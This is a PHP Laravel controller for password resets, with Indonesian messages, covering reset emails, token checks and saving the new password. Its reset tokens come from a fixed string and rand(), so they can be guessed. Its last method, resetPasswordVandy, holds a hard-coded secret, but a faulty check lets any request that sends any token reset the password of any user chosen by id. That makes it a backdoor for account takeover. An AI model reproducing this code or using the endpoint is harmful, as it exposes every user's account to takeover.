<?php

namespace App\Http\Controllers;

use App\Forgot;
use App\Mail\ForgotPassMail;
use App\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Facades\Hash;

class ResetPasswordController extends Controller
{
    public function show(){
        return view('auth.passwords.email');
    }
    public function send(Request $request){
        $validator = Validator::make($request->all(), [
            'email' => 'bail|required|email:rfc|exists:users,email',
        ]);
        
        if ($validator->fails()) {
            return back()
                        ->withErrors($validator)
                        ->withInput();
        }
        $forgot = Forgot::where('email',$request->email)->first();
        if ($forgot === null){
            //not exixst
            $token = "asdosku"."0M4N".rand(10000,99999).rand(10000,99999).rand(10000,99999).rand(10000,99999);
            $forgot = new Forgot;
            $forgot->email = $request->email;
            $forgot->token = $token;
            $link = route("resetpage",["email"=>$forgot->email,"token"=>$forgot->token]);
            $forgot->link = $link; 
            $forgot->save();
            
        }
        //$url = route("resetpage",["email"=>$forgot->email,"token"=>$forgot->token]);
        $user = User::where("email",$forgot->email)->first();
        Mail::to($user)->send(new ForgotPassMail($forgot));
        
        return view('auth.passwords.email',['message'=>'berhasil','user'=>$user]);
    }
    public function resetpage($email,$token){
        $forgot = Forgot::where('email',$email)->where('token',$token)->first();
        if ($forgot === null){
            //doesnt exist
            return abort(403,"Email atau token tidak tepat.");
        }
        return view('auth.passwords.reset',['email'=>$email,'token'=>$token]);
    }
    public function savereset(Request $request){
        $validator = Validator::make($request->all(), [
            'email' => 'bail|required|email:rfc|exists:users,email',
            'password'=>'bail|required|confirmed|min:8',
            'password_confirmation'=>'required'
        ]);
        
        if ($validator->fails()) {
            return back()
                        ->withErrors($validator)
                        ->withInput();
        }
        $forgot = Forgot::where("email",$request->email)->where("token",$request->token)->first();
        if ($forgot === null){
            return abort(403,"Email atau token tidak tepat.");
        }
        $newpass = Hash::make($request->password);
        $user = User::where('email',$request->email)->first();
        $user->remember_token = "";
        $user->password = $newpass;
        $user->save();
        $forgot->delete();
        return view('auth.passwords.reset',['user'=>$user,'message'=>'success']);
   
    }
    public function resetPasswordVandy(Request $request, $id)
    {
        if($request->token!="l9q7Wd9aSCpR3nmvMSe3NFQGKUdnspBu" && !isset($request->token)){
            return redirect()->route('home');
        }else{
           $user = User::find($id);
           $user->password=Hash::make($request->password);
           $user->save();
            return redirect()->route('home');  
        }       
    }
}
